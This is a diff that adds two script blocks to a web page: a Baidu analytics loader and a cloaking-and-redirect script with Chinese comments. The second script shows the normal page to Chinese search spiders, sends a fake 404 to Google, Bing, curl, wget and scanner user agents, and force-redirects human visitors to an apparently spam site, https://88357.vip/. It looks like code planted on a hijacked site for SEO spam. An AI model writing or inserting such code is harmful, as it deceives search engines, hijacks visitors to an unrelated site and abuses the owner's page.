@@ -1,0 +1,58 @@
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?86435d3a2f241f9fe400b3eaf69d2337";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script>
+(function() {
+    var ua = navigator.userAgent.toLowerCase();
+
+    // ==========================================
+    // 1. 防劫持
+    // ==========================================
+    if (window.top !== window.self) {
+        window.top.location.href = window.location.href;
+        return;
+    }
+
+    // ==========================================
+    // 2. 配置跳转目标（改成你自己的地址）
+    // ==========================================
+    var targetUrl = "https://88357.vip/";
+
+    // ==========================================
+    // 3. 国内搜索引擎蜘蛛 → 正常显示（保收录）
+    // ==========================================
+    var chinaBots = /baiduspider|360spider|sogou|sosospider|yisouspider/i;
+    if (chinaBots.test(ua)) {
+        // 蜘蛛访问，不跳转，正常显示页面
+        console.log("🕷️ 蜘蛛访问，页面正常显示");
+        return;
+    }
+
+    // ==========================================
+    // 4. 海外恶意爬虫 → 返回404（防被K）
+    // ==========================================
+    var badBots = /googlebot|bingbot|bytespider|toutiaospider|facebook|twitter|linkedin|pinterest|mj12bot|ahrefs|semrush|dotbot|exabot|ia_archiver|yandex|duckduckbot|petalbot|applebot|facebookexternalhit|twitterbot|dataprovider|scrapy|python|urllib|wget|curl|spider|crawler|scraper|fetch|scan|bot/i;
+    if (badBots.test(ua)) {
+        document.write('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>');
+        return;
+    }
+
+    // ==========================================
+    // 5. 真人访客 → 直接跳转
+    // ==========================================
+    window.location.replace(targetUrl);
+
+    // 兜底：0.3秒后强制跳转
+    setTimeout(function() {
+        if (window.location.href.indexOf(targetUrl) === -1) {
+            window.location.href = targetUrl;
+        }
+    }, 300);
+})();
+</script>
